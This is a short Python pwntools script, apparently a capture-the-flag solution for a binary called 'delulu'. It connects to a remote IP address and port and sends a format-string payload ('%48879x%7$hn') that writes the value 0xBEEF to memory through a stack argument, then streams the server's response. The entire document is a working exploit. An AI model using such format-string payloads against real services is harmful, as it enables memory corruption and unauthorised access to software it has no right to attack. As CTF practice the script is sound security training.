#!/bin/pyhton3

from pwn import *


io = remote('94.237.56.118', 48022)
#io = process('./delulu')
payload = f'%48879x%7$hn'
io.sendlineafter(b'>>', payload.encode())
io.stream()

